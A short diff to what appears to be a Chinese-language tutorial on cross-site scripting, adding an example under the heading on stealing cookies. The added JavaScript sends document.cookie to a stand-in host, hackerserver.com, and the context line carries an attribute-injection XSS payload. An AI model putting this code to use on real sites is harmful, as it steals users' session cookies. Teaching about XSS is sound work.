@@ -65,31 +65,11 @@ http://www.xxx.com/?id=xx" οnerrοr="this.onload()" οnlοad="alert(/xss/)" x="
 
 1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```
+var i=document.createElement("img");
+document.body.appendChild(i);
+i.src = "http://www.hackerserver.com/?c=" + document.cookie;
+```
 
 
 
